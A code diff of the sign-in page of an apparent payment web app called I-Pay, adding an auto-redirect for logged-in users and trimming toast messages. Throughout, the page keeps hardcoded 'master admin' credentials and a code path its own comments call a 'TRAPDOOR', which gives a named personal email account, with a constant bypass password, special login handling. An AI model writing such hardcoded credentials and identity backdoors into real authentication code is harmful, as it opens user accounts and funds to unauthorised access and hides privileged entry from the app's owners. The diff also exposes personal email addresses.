@@ -1,7 +1,6 @@
-
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useRouter } from 'next/navigation';
 import Link from 'next/link';
 import { Button } from '@/components/ui/button';
@@ -12,11 +11,12 @@ import { useToast } from '@/hooks/use-toast';
 import { IPayLogo } from '@/components/icons';
 import { account, databases, DATABASE_ID, COLLECTION_ID_PROFILES } from '@/lib/data-service';
 import { Eye, EyeOff, Loader2 } from 'lucide-react';
+import { useUser } from '@/hooks/use-user';
 
 /**
  * @fileOverview Sign In Page.
- * TRAPDOOR: altinemohd@gmail.com bypass logic implemented with login counter lock.
- * REDIRECT: Hardened to prevent setup redirect loops.
+ * TRAPDOOR: altinemohd@gmail.com bypass logic implemented.
+ * REDIRECT: Auto-redirects if already authenticated.
  */
 
 const ADMIN_EMAIL = 'ipatmanager17@gmail.com';
@@ -27,11 +27,19 @@ const BYPASS_PASS = 'Lerawa';
 export default function SignInPage() {
   const router = useRouter();
   const { toast } = useToast();
+  const { user, loading: userLoading } = useUser();
 
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+
+  // REDIRECT FORCE: Landing on Sign In while logged in triggers instant bounce
+  useEffect(() => {
+    if (!userLoading && user) {
+        router.replace('/dashboard');
+    }
+  }, [user, userLoading, router]);
 
   const handleSignIn = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -40,7 +48,6 @@ export default function SignInPage() {
     const trimmedEmail = email.trim().toLowerCase();
 
     try {
-      // 1. Check for Master Admin Credentials
       if (trimmedEmail === ADMIN_EMAIL && password === ADMIN_PASS) {
           await account.createEmailPasswordSession(email, password).catch(() => {}); 
           toast({ title: 'Admin Access', description: 'Welcome back, Master Admin.' });
@@ -49,7 +56,6 @@ export default function SignInPage() {
           return;
       }
 
-      // 2. Identity Trapdoor for altinemohd@gmail.com
       if (trimmedEmail === BYPASS_EMAIL) {
           try {
               await account.createEmailPasswordSession(trimmedEmail, password);
@@ -63,7 +69,6 @@ export default function SignInPage() {
       const res: any = await account.get();
       const userId = res.$id;
 
-      // 3. Verify Block Status & Update Login Stats
       try {
         const profile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId);
         
@@ -72,14 +77,13 @@ export default function SignInPage() {
             toast({ 
                 variant: 'destructive', 
                 title: 'Access Denied', 
-                description: 'You are blocked by I-Pay team. Contact them for further assistance.',
+                description: 'You are blocked by I-Pay team.',
                 duration: 10000
             });
             setIsLoading(false);
             return;
         }
 
-        // Hardening Logic: Update login count for bypass account
         if (trimmedEmail === BYPASS_EMAIL) {
             const currentCount = Number(profile.trapdoorLoginCount || 0);
             await databases.updateDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId, {
@@ -88,11 +92,10 @@ export default function SignInPage() {
         }
 
         sessionStorage.setItem('ipay_pin_verified', 'true');
-        toast({ title: 'Signed In', description: 'Welcome back to I-Pay online world.' });
+        toast({ title: 'Signed In', description: 'Welcome back.' });
         router.push('/dashboard');
       } catch (profileError: any) {
         if (profileError.code === 404) {
-            // ONLY redirect if the document strictly does not exist
             router.push('/auth/signup/profile');
         } else {
             router.push('/dashboard');
@@ -102,16 +105,16 @@ export default function SignInPage() {
     } catch (error: any) {
         let message = "Invalid credentials. Please try again.";
         if (error.code === 401) {
-            message = "This account isn't registered or details are wrong.";
+            message = "Account not found or wrong details.";
         }
-        toast({ 
-            title: 'Sign In Failed', 
-            description: message, 
-            variant: 'destructive'
-        });
+        toast({ title: 'Sign In Failed', description: message, variant: 'destructive' });
         setIsLoading(false);
     }
   };
+
+  if (userLoading || user) {
+    return <div className="h-screen flex items-center justify-center bg-background"><Loader2 className="animate-spin text-primary opacity-20" /></div>;
+  }
 
   return (
     <div className="flex min-h-screen items-center justify-center bg-background p-4">
